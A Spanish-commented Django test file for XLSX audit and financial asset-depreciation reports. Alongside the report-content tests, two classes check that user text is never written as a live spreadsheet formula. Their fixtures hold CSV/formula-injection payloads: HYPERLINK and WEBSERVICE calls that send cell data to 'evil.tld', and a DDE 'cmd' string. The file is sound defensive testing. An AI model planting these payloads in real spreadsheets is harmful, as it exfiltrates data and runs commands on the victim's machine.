"""Pruebas del reporte de auditoria XLSX (RF-006).

Cubren lo de alto valor: el corte al 30/09 recalcula dep/libros/estado a esa
fecha, los activos iniciados despues del corte se excluyen, hay una hoja por
categoria con su nombre, y la respuesta es un .xlsx descargable.
"""
import zipfile
from datetime import date
from decimal import Decimal
from io import BytesIO

from django_tenants.test.cases import TenantTestCase
from django_tenants.utils import tenant_context
from openpyxl import load_workbook
from rest_framework.test import APIClient

from accounts.models import Usuario
from accounts.tokens import crear_refresh
from assets.depreciacion import calcular_depreciacion
from assets.models import Activo, Categoria, Localizacion


class ReporteAuditoriaTest(TenantTestCase):
    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        with tenant_context(cls.tenant):
            cls.user = Usuario.objects.create_user(username='aud', password='secreta123')
            cls.computo = Categoria.objects.create(nombre='Cómputo', prefijo='COM')
            cls.mobiliario = Categoria.objects.create(nombre='Mobiliario', prefijo='MOB')
            cls.loc = Localizacion.objects.create(nombre='Oficinas')
            # Activo vigente al corte 2024-09-30.
            cls._crear('COM-0001', 'Laptop', cls.computo, '2020-09-30')
            # Activo de otra categoria (para verificar una hoja por categoria).
            cls._crear('MOB-0001', 'Escritorio', cls.mobiliario, '2021-01-01')
            # Iniciado despues del corte: debe quedar excluido.
            cls._crear('COM-0002', 'Tablet', cls.computo, '2024-10-01')
        cls.host = cls.tenant.get_primary_domain().domain

    @classmethod
    def _crear(cls, numero, nombre, categoria, fecha_inicio):
        return Activo.objects.create(
            numero_activo=numero, nombre=nombre,
            costo_original=Decimal('1200000'), valor_libros_actual=Decimal('0'),
            depreciacion_acumulada_actual=Decimal('0'),
            fecha_adquisicion=date.fromisoformat(fecha_inicio),
            fecha_inicio=date.fromisoformat(fecha_inicio),
            vida_util_anios=10, estado_depreciacion='DEPRECIANDO',
            localizacion=cls.loc, categoria=categoria,
        )

    def setUp(self):
        self.client = APIClient()
        with tenant_context(self.tenant):
            access = str(crear_refresh(self.user).access_token)
        self.client.cookies['access'] = access

    def _get(self, anio=2024):
        return self.client.get(f'/api/reportes/auditoria/?anio={anio}', HTTP_HOST=self.host)

    def _wb(self, resp):
        return load_workbook(BytesIO(resp.content))

    def test_requiere_sesion(self):
        anon = APIClient()
        resp = anon.get('/api/reportes/auditoria/?anio=2024', HTTP_HOST=self.host)
        self.assertEqual(resp.status_code, 401)

    def test_respuesta_es_xlsx_descargable(self):
        resp = self._get()
        self.assertEqual(resp.status_code, 200)
        self.assertIn('spreadsheetml.sheet', resp['Content-Type'])
        self.assertIn('reporte_auditoria_2024.xlsx', resp['Content-Disposition'])

    def test_una_hoja_por_categoria_con_su_nombre(self):
        wb = self._wb(self._get())
        self.assertEqual(set(wb.sheetnames), {'Cómputo', 'Mobiliario'})
        # El nombre de la categoria tambien encabeza la hoja (fila 1).
        self.assertEqual(wb['Cómputo']['A1'].value, 'Cómputo')

    def test_recalcula_dep_libros_y_estado_al_30_de_septiembre(self):
        wb = self._wb(self._get(2024))
        ws = wb['Cómputo']
        # Fila 3 = encabezados; los datos empiezan en la 4. COM-0001 es el unico
        # vigente de Cómputo (COM-0002 se excluye). Columnas: H=libros, I=dep.
        fila = [c.value for c in ws[4]]
        self.assertEqual(fila[0], 'COM-0001')
        dep, libros, _ = calcular_depreciacion(
            Decimal('1200000'), 10, date(2020, 9, 30), hasta=date(2024, 9, 30))
        self.assertAlmostEqual(fila[7], float(libros), places=2)  # Valor en libros
        self.assertAlmostEqual(fila[8], float(dep), places=2)     # Dep. acumulada

    def test_excluye_activos_iniciados_despues_del_corte(self):
        wb = self._wb(self._get(2024))
        numeros = [
            ws.cell(row=r, column=1).value
            for ws in wb.worksheets for r in range(4, ws.max_row + 1)
        ]
        self.assertIn('COM-0001', numeros)
        self.assertNotIn('COM-0002', numeros)  # inicio 2024-10-01 > corte

    def test_anio_invalido_da_400(self):
        resp = self.client.get('/api/reportes/auditoria/?anio=abc', HTTP_HOST=self.host)
        self.assertEqual(resp.status_code, 400)


class ReporteFinancieroTest(TenantTestCase):
    """Reporte financiero XLSX (RF-006): corte al ultimo dia del mes solicitado,
    agrupado por categoria, con la empresa solicitante y el mes en el encabezado."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.tenant.nombre = 'Comercial Rivera S.A.'
        cls.tenant.save()
        with tenant_context(cls.tenant):
            cls.user = Usuario.objects.create_user(username='fin', password='secreta123')
            cls.computo = Categoria.objects.create(nombre='Cómputo', prefijo='COM')
            cls.mobiliario = Categoria.objects.create(nombre='Mobiliario', prefijo='MOB')
            cls.loc = Localizacion.objects.create(nombre='Oficinas')
            cls._crear('COM-0001', 'Laptop', cls.computo, '2023-01-15')
            cls._crear('MOB-0001', 'Escritorio', cls.mobiliario, '2023-03-01')
            # Iniciado despues del corte 2024-06-30: debe quedar excluido.
            cls._crear('COM-0002', 'Tablet', cls.computo, '2024-07-01')
        cls.host = cls.tenant.get_primary_domain().domain

    @classmethod
    def _crear(cls, numero, nombre, categoria, fecha_inicio):
        return Activo.objects.create(
            numero_activo=numero, nombre=nombre,
            costo_original=Decimal('1200000'), valor_libros_actual=Decimal('0'),
            depreciacion_acumulada_actual=Decimal('0'),
            fecha_adquisicion=date.fromisoformat(fecha_inicio),
            fecha_inicio=date.fromisoformat(fecha_inicio),
            vida_util_anios=10, estado_depreciacion='DEPRECIANDO',
            localizacion=cls.loc, categoria=categoria,
        )

    def setUp(self):
        self.client = APIClient()
        with tenant_context(self.tenant):
            access = str(crear_refresh(self.user).access_token)
        self.client.cookies['access'] = access

    def _get(self, corte='2024-06'):
        return self.client.get(
            f'/api/reportes/financiero/?corte={corte}', HTTP_HOST=self.host)

    def _ws(self, resp):
        return load_workbook(BytesIO(resp.content)).active

    def test_requiere_sesion(self):
        anon = APIClient()
        resp = anon.get('/api/reportes/financiero/?corte=2024-06', HTTP_HOST=self.host)
        self.assertEqual(resp.status_code, 401)

    def test_respuesta_es_xlsx_descargable(self):
        resp = self._get()
        self.assertEqual(resp.status_code, 200)
        self.assertIn('spreadsheetml.sheet', resp['Content-Type'])
        self.assertIn('reporte_financiero_2024-06.xlsx', resp['Content-Disposition'])

    def test_encabezado_con_empresa_y_mes(self):
        ws = self._ws(self._get('2024-06'))
        self.assertEqual(ws['A1'].value, self.tenant.nombre)
        self.assertIn('junio 2024', ws['A6'].value)

    def test_agrupa_por_categoria_con_banner_y_subtotales(self):
        ws = self._ws(self._get('2024-06'))
        textos = [
            ws.cell(row=r, column=1).value
            for r in range(1, ws.max_row + 1)
        ]
        self.assertIn('CÓMPUTO (COM)', textos)
        self.assertIn('MOBILIARIO (MOB)', textos)
        self.assertTrue(any(str(t).startswith('SUBTOTAL') for t in textos if t))
        self.assertIn('TOTAL GENERAL', textos)

    def test_corte_es_ultimo_dia_del_mes_y_recalcula(self):
        ws = self._ws(self._get('2024-06'))
        # El detalle empieza tras el resumen; ubicamos la fila de COM-0001.
        fila = next(
            [c.value for c in ws[r]]
            for r in range(1, ws.max_row + 1)
            if ws.cell(row=r, column=1).value == 'COM-0001'
        )
        dep, libros, _ = calcular_depreciacion(
            Decimal('1200000'), 10, date(2023, 1, 15), hasta=date(2024, 6, 30))
        self.assertAlmostEqual(fila[6], float(dep), places=2)     # Dep. acumulada
        self.assertAlmostEqual(fila[7], float(libros), places=2)  # Valor en libros

    def test_excluye_activos_iniciados_despues_del_corte(self):
        ws = self._ws(self._get('2024-06'))
        numeros = [ws.cell(row=r, column=1).value for r in range(1, ws.max_row + 1)]
        self.assertIn('COM-0001', numeros)
        self.assertNotIn('COM-0002', numeros)  # inicio 2024-07-01 > corte

    def test_corte_invalido_da_400(self):
        resp = self.client.get(
            '/api/reportes/financiero/?corte=2024', HTTP_HOST=self.host)
        self.assertEqual(resp.status_code, 400)


class InyeccionFormulasAuditoriaTest(TenantTestCase):
    """El nombre, la serie, la factura y los nombres de catalogo son texto libre
    de cualquier usuario autenticado. openpyxl liga como formula viva todo
    string que empiece con '=', asi que un activo bien nombrado ejecuta codigo
    en la maquina de quien abra el reporte. Ninguna celda de estos libros debe
    quedar escrita como formula."""

    CARGA = '=HYPERLINK("https://evil.tld/?d="&A4,"Ver detalle")'

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        with tenant_context(cls.tenant):
            cls.user = Usuario.objects.create_user(username='inj', password='secreta123')
            # La categoria da el titulo A1 de la hoja: tambien es texto de usuario.
            categoria = Categoria.objects.create(nombre='=1+1', prefijo='INJ')
            loc = Localizacion.objects.create(nombre='Oficinas')
            Activo.objects.create(
                numero_activo='INJ-0001', nombre=cls.CARGA,
                serie='@SUM(A1)', factura='+1+1',
                costo_original=Decimal('1000000'), valor_libros_actual=Decimal('0'),
                depreciacion_acumulada_actual=Decimal('0'),
                fecha_adquisicion=date(2020, 1, 1), fecha_inicio=date(2020, 1, 1),
                vida_util_anios=10, estado_depreciacion='DEPRECIANDO',
                localizacion=loc, categoria=categoria,
            )
        cls.host = cls.tenant.get_primary_domain().domain

    def setUp(self):
        self.client = APIClient()
        with tenant_context(self.tenant):
            self.client.cookies['access'] = str(crear_refresh(self.user).access_token)

    def _descargar(self):
        resp = self.client.get('/api/reportes/auditoria/?anio=2024', HTTP_HOST=self.host)
        self.assertEqual(resp.status_code, 200)
        return resp.content

    def _celda_del_activo(self, ws, columna):
        fila = next(r for r in range(1, ws.max_row + 1)
                    if ws.cell(row=r, column=1).value == 'INJ-0001')
        return ws.cell(row=fila, column=columna)

    def test_el_nombre_queda_como_texto_no_como_formula(self):
        ws = load_workbook(BytesIO(self._descargar())).active
        celda = self._celda_del_activo(ws, 2)   # columna 'Nombre'
        self.assertEqual(celda.data_type, 's')
        # El texto se conserva intacto: no se le agrega un apostrofo ni se recorta.
        self.assertEqual(celda.value, self.CARGA)

    def test_el_titulo_de_la_hoja_tampoco_queda_como_formula(self):
        ws = load_workbook(BytesIO(self._descargar())).active
        self.assertEqual(ws['A1'].data_type, 's')
        self.assertEqual(ws['A1'].value, '=1+1')

    def test_ninguna_celda_del_libro_se_escribe_como_formula(self):
        # La prueba de fondo, sobre el XML crudo: si openpyxl hubiera ligado
        # algo como formula habria un elemento <f> en la hoja. data_type puede
        # mentir tras una recarga; el XML no.
        contenido = self._descargar()
        with zipfile.ZipFile(BytesIO(contenido)) as z:
            hojas = [n for n in z.namelist() if n.startswith('xl/worksheets/')]
            self.assertTrue(hojas)
            for nombre in hojas:
                xml = z.read(nombre).decode('utf-8')
                self.assertNotIn('<f>', xml, f'{nombre} contiene una formula viva')
                self.assertNotIn('<f ', xml, f'{nombre} contiene una formula viva')


class InyeccionFormulasFinancieroTest(TenantTestCase):
    """El libro financiero es un sumidero aparte: no comparte helper de
    escritura con el de auditoria y lo sirve otro endpoint, asi que arreglar
    uno solo dejaba este explotable. Ademas del nombre del activo, aqui son
    texto de usuario el nombre de la empresa (banda 1) y las etiquetas de
    categoria del resumen y del detalle."""

    CARGA = '=WEBSERVICE("http://evil.tld/"&A10)'

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        with tenant_context(cls.tenant):
            cls.user = Usuario.objects.create_user(username='injfin', password='secreta123')
            categoria = Categoria.objects.create(nombre='=1+1', prefijo='INF')
            loc = Localizacion.objects.create(nombre='Oficinas')
            Activo.objects.create(
                numero_activo='INF-0001', nombre=cls.CARGA,
                costo_original=Decimal('1000000'), valor_libros_actual=Decimal('0'),
                depreciacion_acumulada_actual=Decimal('0'),
                fecha_adquisicion=date(2020, 1, 1), fecha_inicio=date(2020, 1, 1),
                vida_util_anios=10, estado_depreciacion='DEPRECIANDO',
                localizacion=loc, categoria=categoria,
            )
        cls.host = cls.tenant.get_primary_domain().domain

    def setUp(self):
        self.client = APIClient()
        with tenant_context(self.tenant):
            self.client.cookies['access'] = str(crear_refresh(self.user).access_token)

    def _descargar(self):
        resp = self.client.get('/api/reportes/financiero/?corte=2024-06', HTTP_HOST=self.host)
        self.assertEqual(resp.status_code, 200)
        return resp.content

    def test_el_nombre_del_activo_queda_como_texto(self):
        ws = load_workbook(BytesIO(self._descargar())).active
        fila = next(r for r in range(1, ws.max_row + 1)
                    if ws.cell(row=r, column=1).value == 'INF-0001')
        celda = ws.cell(row=fila, column=2)   # Descripcion
        self.assertEqual(celda.data_type, 's')
        self.assertEqual(celda.value, self.CARGA)

    def test_ninguna_celda_del_libro_se_escribe_como_formula(self):
        with zipfile.ZipFile(BytesIO(self._descargar())) as z:
            hojas = [n for n in z.namelist() if n.startswith('xl/worksheets/')]
            self.assertTrue(hojas)
            for nombre in hojas:
                xml = z.read(nombre).decode('utf-8')
                self.assertNotIn('<f>', xml, f'{nombre} contiene una formula viva')
                self.assertNotIn('<f ', xml, f'{nombre} contiene una formula viva')

    def test_el_nombre_de_la_empresa_tampoco_queda_como_formula(self):
        # La banda 1 lleva el nombre de la empresa, que se fija al darla de alta.
        with tenant_context(self.tenant):
            from assets.reportes import construir_libro_financiero
            wb = construir_libro_financiero(date(2024, 6, 30), '=cmd|\'/c calc\'!A1')
        celda = wb.active['A1']
        self.assertEqual(celda.data_type, 's')
